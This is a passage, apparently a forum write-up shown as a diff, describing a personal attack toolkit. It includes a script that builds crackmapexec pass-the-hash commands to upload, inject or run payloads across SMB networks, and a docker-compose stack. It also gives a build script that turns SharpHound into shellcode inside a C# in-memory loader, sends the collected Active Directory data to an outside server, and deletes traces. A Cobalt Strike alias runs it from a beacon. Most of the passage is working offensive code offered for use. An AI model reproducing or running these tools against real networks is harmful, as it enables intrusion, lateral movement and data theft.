+USER="$(cat /tmp/.values | cut -d'|' -f2)"
+HASH="$(cat /tmp/.values | cut -d'|' -f3)"
+METH="$(cat /tmp/.values | cut -d'|' -f4)"
+if [ -z "$CIDR" ] || [ -z "$USER" ] || [ -z "$HASH" ] ; then exit 0 ; fi
+
+if test "$METH" = "put" || test "$METH" = "inject" ; then
+INPUT="$(zenity --window-icon=/usr/share/icons/Papirus/128x128/apps/clamav.svg --file-selection --title=NetworkAbuser)" ; OUTPUT="$(echo $INPUT | awk -F'/' '{print $NF}')"
+elif test "$METH" = "execute" ; then
+EXECCMD="$(zenity --window-icon=/usr/share/icons/Papirus/128x128/apps/clamav.svg --title=NetworkAbuser --text='Enter your command...' --width=400 --entry)"
+fi
+
+if test "$METH" = "put" ; then
+echo "proxychains  crackmapexec -t 30 --verbose smb $CIDR -u $USER -H $HASH --put-file $INPUT \\\\Windows\\\\Temp\\\\$OUTPUT -x \\\\Windows\\\\Temp\\\\$OUTPUT" > /tmp/.crackmapexeccmd
+elif test "$METH" = "inject" ; then
+echo "proxychains  crackmapexec -t 30 --verbose smb $CIDR -u $USER -H $HASH -M pe_inject -o PATH=$INPUT" > /tmp/.crackmapexeccmd
+elif test "$METH" = "execute" ; then
+echo "proxychains  crackmapexec -t 30 --verbose smb $CIDR -u $USER -H $HASH -x "$EXECMD"" > /tmp/.crackmapexeccmd
+fi
+
+chmod +x /tmp/.crackmapexeccmd ; xfce4-terminal --fullscreen --hide-menubar --hide-toolbar --hide-scrollbar -e 'sudo /tmp/.crackmapexeccmd' --hold
+```
+
+## 4.aCompot
+
+I forgot the most important thing: building everything with docker-compose. There is a file with the same name in the /localhost folder on the host, which looks something like this:
+```
+version: "3.7"
+services:
+
+  wireguard:
+    image: jordanpotter/wireguard
+    container_name: wireguard
+    restart: unless-stopped
+    networks:
+      - backbone
+    volumes:
+      - '/etc/wireguard/socks/wg.conf:/etc/wireguard/mullvad.conf'
+      - '/lib/modules:/lib/modules'
+    cap_add:
+      - NET_ADMIN
+      - SYS_MODULE
+    sysctls:
+      - net.ipv4.conf.all.src_valid_mark=1
+      - net.ipv4.ip_forward=1
+
+  suos:
+    depends_on:
+      - wireguard
+    image: kali_suos
+    container_name: suos
+    restart: unless-stopped
+    network_mode: service:wireguard
+    cap_add:
+      - NET_ADMIN
+    volumes:
+      - '/opt/kali_suos/root:/root'
+      - '/var/run/docker.sock:/var/run/docker.sock'
+    command: bash /entrypoint.sh
+    environment:
+      - HOSTNAME=$HOSTNAME
+
+  acun:
+    depends_on:
+      - wireguard
+    image: 0x4k/acunetix
+    container_name: acun
+    restart: unless-stopped
+    network_mode: service:wireguard
+    command: bash /start.sh
+
+networks:
+  backbone:
+    driver: bridge
+```
+
+And also the file `up.sh`
+
+```bash
+#!/bin/bash
+cd /localhost ; docker commit suos kali_suos
+export HOSTNAME="$(hostname)" ;  docker-compose down --remove-orphans
+docker-compose  up -d --force-recreate --remove-orphans
+```
+
+As you can easily guess, acunetix is the compote. The file up.sh will save the container in its current state and recreate the rest (recreate containers does not mean rebuild, keep in mind))))
+Compot is a client, to work with a graphical shell and nice bonuses, in the form of multiplatform and the tray icon. It is an electron application, which also gives a layer of "onion" to our security, and in addition to that terribly easy to use. It is compiled on the host with the command makeclients, after which it gives you a link to download the Windows and Linux versions. In general, I tried to make the installer as simple and informative as possible... Did you like it, but honestly?)
+
+You can read the white background (and the most attentive have already read and installed it, because it all "hung" in my signature) at: https://x4k.tools XD
+
+https://www.youtube.com/watch?v=oSSzoCuqgG4 (duration 2 mins)
+Video Title: Petya. Misha. WannaCr...?
+
+https://www.youtube.com/watch?v=3GRnQXXGky0 (duration 13 mins)
+Video Title: cme
+Note: It's best you watch the whole thing it's not a tutorial but think of a demo of crackmapexec and cobalt strike
+
+Update: July 29
+
+So, as I promised - a good article - I'm posting the patch XD. Let's get on the same topic) So:
+
+V2.1 - BloodHound.
+BloodHound is a legendary dog, a lot of people wanted to, but couldn't.
+
+I did the following: I installed a service on the host (several, to be exact) which listens on :899 and accepts the .zips that the ingestor generates. Ingestor in turn runs fileless, via execute-assembly. It is built in steps like this: download the latest official compiled SharpHound.exe, use donut to convert it into shellcode and add some arguments to run it. There were several options, the most convenient was the method with ReflectiveLoader. But I decided to do csharp, I thought it would be better. I used the simplest RunPE and added my own functions. After the shellcode execution in memory, the resulting zip-archive is "forwarded" to the host, where the above mentioned :899 is waiting for it for parsing and analysis. After that, the working folder is deleted. The rest is done by sleep (for those who don't know, Rafael created his own language, in which the aggressive script is written). A little bit about BloodHound: a utility which is an invaluable aid in the process of moving. It builds amazing graphs and collects a huge amount of information. In the graphical interface, in addition to viewing this information, you can easily find out the "way" to any kind of Admins and other fabulous creatures. To make it easier for you to get - the arrows are lubricated with a special potion, which by clicking the right mouse button to the item "Help", oddly enough, but provides the REAL help, in the form of direct commands, without unraveling quests and the same, without any embarrassment References.
+
+Look at figure bloodhound_figure_1.png
+
+To put it simply - allows you, without pain, humiliation, and most importantly a lot of time spent on poking around the network to get the "Main Prize". So, its main active part, which is initialized before starting the client ks.
+
+```bash
+#!/bin/bash
+
+rndname="$(curl -s https://gitlab.com/x4k/pub/-/raw/master/names.txt | shuf -n1)"
+rm -r /opt/cobaltstrike/custom/sweet/output &> /dev/null ; mkdir /opt/cobaltstrike/custom/sweet/output
+wget -qO /tmp/SharpHound.exe https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe
+donut -a2 -z2 -i/tmp/SharpHound.exe -p"--NoSaveCache --ZipFilename report --CollectionMethod All" -o /tmp/loader.bin
+XBYTES="$(xxd -i /tmp/loader.bin | tail -n1 | cut -d'=' -f2 | head -c-2 | sed 's+ ++g')"
+
+cat<<EOF>/opt/cobaltstrike/custom/sweet/output/$rndname.cs
+using System;
+using System.IO;
+using System.Linq;
+using System.Diagnostics;
+using System.Threading;
+using System.Runtime.InteropServices;
+
+namespace ShellcodeLoader
+{
+class Program
+{
+static void Main(string[] args)
+{
+byte[] x64shellcode = new byte[$XBYTES] {
+EOF
+
+xxd -i /tmp/loader.bin | tail -n+2 | head -n-1 >> /opt/cobaltstrike/custom/sweet/output/$rndname.cs
+
+cat<<'EOF'>>/opt/cobaltstrike/custom/sweet/output/$rndname.cs
+IntPtr funcAddr = VirtualAlloc(
+IntPtr.Zero,
+(ulong)x64shellcode.Length,
+(uint)StateEnum.MEM_COMMIT,
+(uint)Protection.PAGE_EXECUTE_READWRITE);
+Marshal.Copy(x64shellcode, 0, (IntPtr)(funcAddr), x64shellcode.Length);
+
+IntPtr hThread = IntPtr.Zero;
+uint threadId = 0;
+IntPtr pinfo = IntPtr.Zero;
+
+hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
+WaitForSingleObject(hThread, 0xFFFFFFFF);
+
+for (int i = 1; i <= 5; i++) {
+Console.WriteLine("Thread paused for {0} second", 5); Thread.Sleep(1000); Console.WriteLine("i value: {0}", i);
+}
+
+string tpath = @"C:\ProgramData\mydata" ; var directory = new DirectoryInfo(tpath); string endfile = @"C:\ProgramData\mydata\report.zip";
+var myFile = (from f in directory.GetFiles("*.zip") orderby f.LastWriteTime descending select f).First();
+string mile = "" + myFile; File.Move(mile, endfile);
+
+System.Net.WebClient Client = new System.Net.WebClient(); Client.Headers.Add("Content-Type", "binary/octet-stream");
+string ServerIp = @"http://zxlab.io:899/upload?token=f9403fc5f537b4ab332a";
+
+if (File.Exists(endfile)) {
+var result = Client.UploadFile(ServerIp, "POST", endfile); Console.WriteLine("Upload complete! Enjoy XD"); File.Delete(endfile);
+} else {
+Console.WriteLine("ERROR! CANNOT DETERMINE USERS DOMAIN OR CANNOT CONECT TO LDAP!"); return;
+}
+
+Process abominable = new Process(); abominable.StartInfo.FileName = "cmd.exe";
+abominable.StartInfo.Arguments = @"/c timeout 10 && rd /q /s C:\ProgramData\mydata";
+abominable.StartInfo.WindowStyle = ProcessWindowStyle.Hidden; abominable.Start();
+
+return;
+}
+
+[DllImport("kernel32.dll")]
+private static extern IntPtr VirtualAlloc(
+IntPtr lpStartAddr,
+ulong size,
+uint flAllocationType,
+uint flProtect);
+
+[DllImport("kernel32.dll")]
+private static extern IntPtr CreateThread(
+uint lpThreadAttributes,
+uint dwStackSize,
+IntPtr lpStartAddress,
+IntPtr param,
+uint dwCreationFlags,
+ref uint lpThreadId);
+
+[DllImport("kernel32.dll")]
+private static extern uint WaitForSingleObject(
+IntPtr hHandle,
+uint dwMilliseconds);
+
+public enum StateEnum
+{
+MEM_COMMIT = 0x1000,
+MEM_RESERVE = 0x2000,
+MEM_FREE = 0x10000
+}
+
+public enum Protection
+{
+PAGE_READONLY = 0x02,
+PAGE_READWRITE = 0x04,
+PAGE_EXECUTE = 0x10,
+PAGE_EXECUTE_READ = 0x20,
+PAGE_EXECUTE_READWRITE = 0x40,
+}
+}
+}
+EOF
+
+sed -i "s+zxlab.io+$HOSTNAME+g" /opt/cobaltstrike/custom/sweet/output/$rndname.cs
+mcs -platform:x64 -t:winexe /opt/cobaltstrike/custom/sweet/output/$rndname.cs -out:/opt/cobaltstrike/custom/sweet/output/$rndname.exe
+cp /opt/cobaltstrike/custom/sweet/sweet.bak /opt/cobaltstrike/custom/sweet/sweet.cna ; sed -i "s+Bloodhound+$rndname+g" /opt/cobaltstrike/custom/sweet/sweet.cna
+```
+
+And a simple startup alias in the terminal beacon:
+
+```java
+alias easyblood {
+brm($1, "C:\\ProgramData\\mydata");
+bmkdir($1, "C:\\ProgramData\\mydata");
+bcd($1, "C:\\ProgramData\\mydata");
+bexecute_assembly($1, "custom/sweet/output/Bloodhound.exe");
+}
+```
+
+/usr/local/bin/cobalstrike has been changed this way:
+
+```bash
+#!/bin/bash
+export PATH=$PATH:~/go/bin/:/opt/PEzor:/opt/PEzor/deps/donut/:/opt/PEzor/deps/wclang/_prefix_PEzor_/bin/
+sudo /opt/cobaltstrike/custom/sweet/makeblood.sh && sleep 2 | zenity --window-icon="/usr/share/icons/Papirus/128x128/apps/clamav.svg" --progress --auto-kill \
+--auto-close --text='D0nt w0rry. Do b4d th1ngs..' --pulsate --title="_unkn0wn:::CobaltStrike" --no-cancel --width="300"
+cd /opt/cobaltstrike
+xhost +
+./start.sh
+```
+
+Now, all you need to do is to get an Admin Account and run in the console of the beacon `easyblood`. Keep in mind that the dog only works in the context of the domain
+
+In addition to the >@, many aspects of the "script" have been changed, and you can see a full and detailed list of them in the last commit. XD
+
+I would like to note that all this is tested, tried out and filmed on video, which I will show a little later ;-) The contest (and mine too) continues ;-)
+
+https://github.com/l4ckyguy/ukn0w/commit/0823f51d01790ef53aa9406f99b6a75dfff7f146?branch=0823f51d01790ef53aa9406f99b6a75dfff7f146&diff=unified
+
+Look at figure FileBrowser_figure_2.png
